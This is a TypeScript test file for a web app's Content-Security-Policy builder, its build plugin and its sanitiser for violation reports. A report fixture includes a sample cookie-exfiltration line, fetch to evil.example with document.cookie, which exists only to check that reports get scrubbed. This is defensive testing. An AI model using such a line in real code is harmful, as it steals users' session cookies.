import { createHash } from 'node:crypto'
import { readFileSync } from 'node:fs'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { CSP_REPORT_PATH, WEATHER_ORIGIN, blockedOf, contentSecurityPolicy, cspHeadersFile, cspMessage, cspViolations, inlineScripts, originOf } from '../../shared/csp.mts'
import { cleanReport } from '../../shared/errorreport.mts'

// The web app had one line of Content-Security-Policy, frame-ancestors, and
// nothing about where scripts may come from or where the page may send what
// it reads. It now ships a whole policy, reported only until the owner
// enforces it: vite.config.ts writes it into dist/_headers from
// shared/csp.mts, with the Supabase project the build talks to and the hash
// of index.html's one inline script.

const SUPABASE = 'https://abcdefghijklmnop.supabase.co'
const sha256 = (text: string) => createHash('sha256').update(text).digest('base64')
const INDEX = readFileSync(new URL('../../index.html', import.meta.url), 'utf8')

/** The policy's directives by name, each with its sources. */
const directives = (policy: string) => new Map(policy.split('; ').map(d => [d.split(' ')[0], d.split(' ').slice(1)] as const))

describe('the policy', () => {
  const policy = contentSecurityPolicy({ supabaseUrl: `${SUPABASE}/`, scriptHashes: ['abc='] })
  const d = directives(policy)

  it('runs only the app’s own scripts and its one inline script, by hash — never inline code or eval', () => {
    expect(d.get('default-src')).toEqual(["'self'"])
    expect(d.get('script-src')).toEqual(["'self'", "'sha256-abc='", "'wasm-unsafe-eval'", 'blob:'])
    expect(policy).not.toContain("'unsafe-eval'")
    expect(d.get('script-src')).not.toContain("'unsafe-inline'")
    expect(d.get('object-src')).toEqual(["'none'"])
    expect(d.get('base-uri')).toEqual(["'none'"])
    expect(d.get('frame-ancestors')).toEqual(["'none'"])
    expect(d.get('frame-src')).toEqual(["'none'"])
    expect(d.get('form-action')).toEqual(["'self'"])
    expect(d.get('worker-src')).toEqual(["'self'"])
  })

  it('lets the page call exactly its own API, the Supabase project it was built for, and the weather', () => {
    expect(d.get('connect-src')).toEqual(["'self'", 'blob:', SUPABASE, 'wss://abcdefghijklmnop.supabase.co', WEATHER_ORIGIN])
    expect(d.get('img-src')).toEqual(["'self'", 'blob:', 'data:', SUPABASE])
    // no wildcard anywhere: a policy with one lets the page talk to every project on Supabase
    expect(policy).not.toMatch(/\*/)
  })

  it('in local mode, with no Supabase, names none', () => {
    const local = directives(contentSecurityPolicy({ supabaseUrl: '' }))
    expect(local.get('connect-src')).toEqual(["'self'", 'blob:', WEATHER_ORIGIN])
    expect(local.get('img-src')).toEqual(["'self'", 'blob:', 'data:'])
    expect(originOf('not a url')).toBeNull()
    expect(originOf('javascript:alert(1)')).toBeNull()
  })

  it('sends what it would block to the report endpoint', () => {
    expect(d.get('report-uri')).toEqual([CSP_REPORT_PATH])
    expect(CSP_REPORT_PATH).toBe('/.netlify/functions/csp-report')
  })
})

describe('dist/_headers', () => {
  afterEach(() => vi.unstubAllEnvs())

  it('hashes the theme script index.html actually carries, and nothing else is inline', () => {
    const scripts = inlineScripts(INDEX)
    expect(scripts).toHaveLength(1)
    expect(scripts[0]).toContain("localStorage.getItem('drafter:theme')")
    const file = cspHeadersFile({ html: INDEX, supabaseUrl: SUPABASE, sha256 })
    expect(file).toContain(`'sha256-${sha256(scripts[0])}'`)
    // a script with a src is the bundle's, and is covered by 'self'
    expect(inlineScripts('<script type="module" src="/assets/index-abc.js"></script><script>x()</script>')).toEqual(['x()'])
  })

  it('reports only, on every path, until CSP_ENFORCE turns it on', () => {
    const lines = cspHeadersFile({ html: INDEX, supabaseUrl: SUPABASE, sha256 }).split('\n')
    expect(lines[1]).toBe('/*')
    expect(lines[2]).toMatch(/^ {2}Content-Security-Policy-Report-Only: default-src 'self'; /)
    expect(lines[2]).toContain(contentSecurityPolicy({ supabaseUrl: SUPABASE, scriptHashes: [sha256(inlineScripts(INDEX)[0])] }))
    const enforced = cspHeadersFile({ html: INDEX, supabaseUrl: SUPABASE, enforce: true, sha256 }).split('\n')
    expect(enforced[2]).toMatch(/^ {2}Content-Security-Policy: default-src 'self'; /)
  })

  it('is written by the build (vite.config.ts), which the iPhone build skips', async () => {
    // what the host says decides the header, so the test says it rather than inherit it
    vi.stubEnv('CSP_ENFORCE', '')
    const config = (await import('../../vite.config')).default as { plugins: unknown[] }
    const plugin = config.plugins.flat(3).find(p => (p as { name?: string } | null)?.name === 'drafter-content-security-policy') as
      | {
          apply: string
          configResolved: (c: { mode: string; env: Record<string, string> }) => void
          generateBundle: (this: { emitFile(f: { fileName: string; source: string }): void; error(m: string): never }, o: unknown, b: Record<string, unknown>) => void
        }
      | undefined
    expect(plugin?.apply).toBe('build')
    const emitted: { fileName: string; source: string }[] = []
    const context = { emitFile: (f: { fileName: string; source: string }) => void emitted.push(f), error: (m: string): never => { throw new Error(m) } }
    plugin!.configResolved({ mode: 'production', env: { VITE_SUPABASE_URL: SUPABASE } })
    plugin!.generateBundle.call(context, {}, { 'index.html': { type: 'asset', source: INDEX } })
    expect(emitted.map(f => f.fileName)).toEqual(['_headers'])
    expect(emitted[0].source).toBe(cspHeadersFile({ html: INDEX, supabaseUrl: SUPABASE, sha256 }))
    // CSP_ENFORCE on the host, and the same policy is enforced
    vi.stubEnv('CSP_ENFORCE', 'true')
    plugin!.configResolved({ mode: 'production', env: { VITE_SUPABASE_URL: SUPABASE } })
    plugin!.generateBundle.call(context, {}, { 'index.html': { type: 'asset', source: INDEX } })
    expect(emitted[1].source).toBe(cspHeadersFile({ html: INDEX, supabaseUrl: SUPABASE, enforce: true, sha256 }))
    plugin!.configResolved({ mode: 'ios', env: { VITE_SUPABASE_URL: SUPABASE } })
    plugin!.generateBundle.call(context, {}, { 'index.html': { type: 'asset', source: INDEX } })
    expect(emitted).toHaveLength(2)
  })
})

describe('a report of what the policy would block', () => {
  const REPORT_URI = {
    'csp-report': {
      'document-uri': 'https://drafterz.netlify.app/?task=Buy%20milk',
      referrer: 'https://drafterz.netlify.app/',
      'violated-directive': 'script-src-elem',
      'effective-directive': 'script-src-elem',
      'original-policy': "default-src 'self'",
      disposition: 'report',
      'blocked-uri': 'https://evil.example/steal.js?who=maria@example.com',
      'source-file': 'https://drafterz.netlify.app/assets/index-abc.js',
      'line-number': 12,
      'script-sample': 'fetch("https://evil.example/?"+document.cookie)',
      'status-code': 200,
    },
  }
  const REPORTING_API = [
    { type: 'csp-violation', url: 'https://drafterz.netlify.app/notes/private', body: { effectiveDirective: 'connect-src', blockedURL: 'wss://tracker.example:8443/socket', disposition: 'enforce', sample: 'secret' } },
    { type: 'csp-violation', body: { effectiveDirective: 'script-src-elem', blockedURL: 'inline', disposition: 'report' } },
    { type: 'deprecation', body: { id: 'x' } },
  ]

  it('keeps the directive and the origin of what it blocked, and nothing about the page', () => {
    expect(cspViolations(REPORT_URI)).toEqual([{ directive: 'script-src-elem', blocked: 'https://evil.example', enforced: false }])
    expect(cspViolations(REPORTING_API)).toEqual([
      { directive: 'connect-src', blocked: 'wss://tracker.example:8443', enforced: true },
      { directive: 'script-src-elem', blocked: 'inline', enforced: false },
    ])
    const kept = JSON.stringify([...cspViolations(REPORT_URI), ...cspViolations(REPORTING_API)])
    expect(kept).not.toMatch(/milk|maria|steal|cookie|notes|private|secret|index-abc|drafterz/)
  })

  it('names only real directives and a few keywords, whatever a report claims', () => {
    expect(cspViolations({ 'csp-report': { 'violated-directive': "script-src 'self' https://x", 'blocked-uri': 'eval' } })).toEqual([{ directive: 'script-src', blocked: 'eval', enforced: false }])
    expect(cspViolations({ 'csp-report': { 'violated-directive': 'Maria Gonzalez', 'blocked-uri': 'Buy milk' } })).toEqual([{ directive: 'other', blocked: 'other', enforced: false }])
    expect(blockedOf('data:image/png;base64,AAAA')).toBe('data')
    expect(blockedOf('blob:https://drafterz.netlify.app/3f2b8c1e')).toBe('blob')
    expect(blockedOf('chrome-extension://abcdefgh/content.js')).toBe('chrome-extension')
    expect(blockedOf('')).toBe('inline')
    expect(cspViolations('nonsense')).toEqual([])
    expect(cspViolations(Array.from({ length: 50 }, () => REPORTING_API[1]))).toHaveLength(10)
  })

  it('reads in Admin as an error the error log’s own rule keeps word for word', () => {
    for (const v of [...cspViolations(REPORT_URI), ...cspViolations(REPORTING_API), { directive: 'frame-ancestors', blocked: 'self', enforced: false }]) {
      const message = cspMessage(v)
      expect(cleanReport({ message, platform: 'web' })!.message).toBe(message)
    }
    expect(cspMessage({ directive: 'img-src', blocked: 'https://cdn.example', enforced: false })).toBe('CSP would block https://cdn.example (img-src)')
    expect(cspMessage({ directive: 'connect-src', blocked: 'wss://tracker.example:8443', enforced: true })).toBe('CSP blocked wss://tracker.example:8443 (connect-src)')
  })
})
